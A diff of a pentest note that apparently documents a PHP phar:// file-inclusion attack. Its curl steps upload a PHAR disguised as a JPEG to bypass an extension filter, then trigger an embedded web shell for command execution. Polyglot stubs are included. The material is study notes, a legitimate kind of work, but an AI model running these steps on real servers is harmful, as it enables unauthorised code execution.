@@ -1,7 +1,7 @@
 # php phar RFI smuggling
 
 **Author:** Julien Bongars\
-**Date:** 2026-02-13 01:36:15\
+**Date:** 2026-02-13 01:36:15
 **Path:**
 
 ---
@@ -10,9 +10,9 @@ link: https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/phar-deseria
 
 You can use phar:// protocol to smuggle a PHP source page to destination
 
-### Attack
+## Attack
 
-#### Construct the PHAR
+### Construct the PHAR
 
 ```php
 <?php
@@ -27,27 +27,27 @@ $phar->setStub("<?php __HALT_COMPILER(); ?>");
 $phar->stopBuffering();
 ```
 
-#### Upload and call the PHAR/shell.php
+### Upload and call the PHAR/shell.php
 
 ```bash
 # Step 1: Build the PHAR
 php attack.php
 mv attack.phar attack.jpeg
 
-# Step 2: Upload the file (bypass extension filter since .jpg is allowed)
-curl -X POST http:///index.php \
+# Step 2: Upload the file (bypass extension filter since .jpeg is allowed)
+curl -X POST http://<target>/index.php \
   -F "upload=1" \
-  -F "file=@shell.jpg"
+  -F "file=@attack.jpeg"
 
 # Step 3: Trigger RFI via phar:// stream wrapper
 # The include() appends ".php", and phar:// lets us reference shell.php inside the archive
-# phar://uploads/shell.jpg/shell  +  ".php"  =>  phar://uploads/shell.jpg/shell.php
-curl "http:///index.php?page=phar://uploads/shell.jpg/shell&cmd=id"
+# phar://uploads/attack.jpeg/shell  +  ".php"  =>  phar://uploads/attack.jpeg/shell.php
+curl "http://<target>/index.php?page=phar://uploads/attack.jpeg/shell&cmd=id"
 
 # Expected output: uid=33(www-data) ...
 ```
 
-### Source
+## Source
 
 ```php
 <?php
@@ -58,7 +58,6 @@ curl "http:///index.php?page=phar://uploads/shell.jpg/shell&cmd=id"
 	}else{
 		include("checker.php");
 	}	
-
 
     if($_POST['upload']){
         $file = $_FILES['file']['name'];
@@ -98,3 +97,9 @@ $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
 $jpeg = file_get_contents('legit.jpg');  // any valid JPEG
 $phar->setStub($jpeg . "<?php __HALT_COMPILER(); ?>");
 ```
+
+## Resources
+
+- [PHP Phar](https://www.php.net/manual/en/book.phar.php) — official archive / `phar://` docs
+- [HackTricks: PHAR deserialization](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/phar-deserialization.html) — source linked in the lede
+- [PayloadsAllTheThings: PHP deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md) — extra PHAR / gadget lookup
